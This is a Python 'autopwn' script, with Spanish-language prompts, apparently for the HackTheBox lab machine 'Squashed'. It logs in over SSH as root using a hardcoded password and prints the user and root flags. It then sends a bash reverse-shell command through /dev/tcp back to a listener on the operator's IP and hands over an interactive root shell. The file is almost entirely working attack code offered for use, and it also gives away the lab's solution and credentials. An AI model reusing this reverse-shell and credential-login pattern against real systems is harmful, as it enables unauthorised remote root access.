import paramiko
from colorama import init,Style,Fore
import os
import time
import signal
import sys
import threading

def def_handler(sig,frame):
    print(f'{Fore.RED}\n[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'{Fore.BLUE}\n[+]JAGGEDMULE - SQUASHED HACKTHEBOX AUTOPWN')
print(f'{Fore.YELLOW}[!]IMPORTANTE! UTILIZA UN PUERTO SUPERIOR AL 1023 (Si no quieres ejecutar este script como root)')

ip = input(f'{Fore.GREEN}\nIntroduce tu IP (tun0): ')
port = input(f'{Fore.GREEN}Introduce el puerto que quieras usar: ')

def ping(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False

def error_executing():
    print(f'{Fore.RED}\n[-]Algo salió mal')
    time.sleep(0.5)
    print(f'{Fore.YELLOW}[!]La máquina está encendida?\n[!]Verifica tu conexión con la máquina')

from pwn import *

if ping('10.10.11.191') == True:
    print(f'{Fore.GREEN}\n[+]Conexión con la máquina exitosa!!')

    def root(commando):
        p = paramiko.SSHClient()
        p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        p.connect("10.10.11.191", port=22, username="root", password="cah$mei7rai9A")
        stdin, stdout, stderr = p.exec_command(commando)
        opt = stdout.readlines()
        print(opt)

    def shell_connection():
        root(f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')

    print(f'{Fore.GREEN}[+]FLAGS\n')
    print(f'{Fore.YELLOW}[+]USER.TXT')
    root('cat /home/alex/user.txt')
    print(f'{Fore.YELLOW}[+]ROOT.TXT')
    root('cat ~/root.txt')
    print('')
    
    try:
        threading.Thread(target=shell_connection).start()
    except Exception as e:
        print(f'{Fore.RED}[-]{e}')

    shellc = listen(port, timeout=5).wait_for_connection()

    if shellc.sock is None:
        error_executing()
    else:
        time.sleep(0.5)
        print(f'{Fore.GREEN}[+]Shell como ROOT exitosa')
        time.sleep(0.5)
        print(f'{Fore.YELLOW}[!]Para salir: cmd exit + CTRL+C')
        
    time.sleep(0.5)
    shellc.sendline('export TERM=xterm-color')
    shellc.interactive()

else:
    error_executing()


